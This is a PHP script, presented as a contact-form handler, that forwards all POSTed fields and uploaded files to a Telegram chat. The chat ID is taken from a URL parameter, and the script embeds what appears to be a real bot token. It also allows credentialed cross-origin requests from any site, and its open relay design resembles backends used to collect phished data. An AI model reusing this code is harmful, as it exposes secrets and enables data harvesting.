<?php
header('Content-Type: application/json');
// Allow requests from any origin
header('Access-Control-Allow-Origin: *');
// Allow the following HTTP methods for CORS requests
header('Access-Control-Allow-Methods: GET, POST, PUT, DELETE, OPTIONS');
// Allow the following headers for CORS requests
header('Access-Control-Allow-Headers: Content-Type');
// Allow cookies to be sent in CORS requests
header('Access-Control-Allow-Credentials: true');
// Set the cache control header to prevent caching of CORS responses
header('Cache-Control: no-cache, no-store, must-revalidate');
header('Pragma: no-cache');
header('Expires: 0');

if ($_SERVER["REQUEST_METHOD"] === "POST") {
    // Process the form data
    $formData = $_POST;
    if (isset($_GET['id'])) {
        $userid = $_GET['id'];
    } else {
        $userid = '21479193538';
    }

    // Save the form submission to a file or database if needed

    // Replace 'YOUR_TELEGRAM_BOT_TOKEN' with your actual Telegram bot token
    $telegramBotToken = '6683877755:AAEZrpG-0ucnpqZyKp-4utwj8COcVpGusa4';
    $telegramChatId = $userid; // Replace with the admin's chat ID

    // Compose the message to be sent to Telegram
    $telegramMessage = "New Contact Form Submission:\n\n";

    // Loop through the form data and create the key-value pairs in the message
    foreach ($formData as $key => $value) {
        $telegramMessage .= "$key: $value\n";
    }

    // Handle file uploads (if any)
    if (isset($_FILES) && count($_FILES) > 0) {
        foreach ($_FILES as $fileField) {
            if ($fileField['error'] === UPLOAD_ERR_OK) {
                $fileContent = file_get_contents($fileField['tmp_name']);
                // Prepare the file attachment data for Telegram API
                $fileAttachment = array(
                    'chat_id' => $telegramChatId,
                    'document' => new CURLFile($fileField['tmp_name'], $fileField['type'], $fileField['name']),
                    'caption' => 'Attachment: ' . $fileField['name'],
                );

                // Send the file to Telegram using the bot API
                $telegramApiUrl = "https://api.telegram.org/bot$telegramBotToken/sendDocument";
                $ch = curl_init($telegramApiUrl);
                curl_setopt($ch, CURLOPT_POST, 1);
                curl_setopt($ch, CURLOPT_POSTFIELDS, $fileAttachment);
                curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
                $result = curl_exec($ch);
                curl_close($ch);
            }
        }
    }

    // Send the message text to Telegram using the bot API
    $telegramApiUrl = "https://api.telegram.org/bot$telegramBotToken/sendMessage";
    $data = array(
        'chat_id' => $telegramChatId,
        'text' => $telegramMessage,
    );

    // Use cURL to send the message
    $ch = curl_init($telegramApiUrl);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    $result = curl_exec($ch);
    curl_close($ch);

    // Handle any response from the Telegram API (optional)
    if ($result === false) {
        echo '{"status":"failed"}';
    } else {
        echo '{"status":"success"}';
    }
}
?>
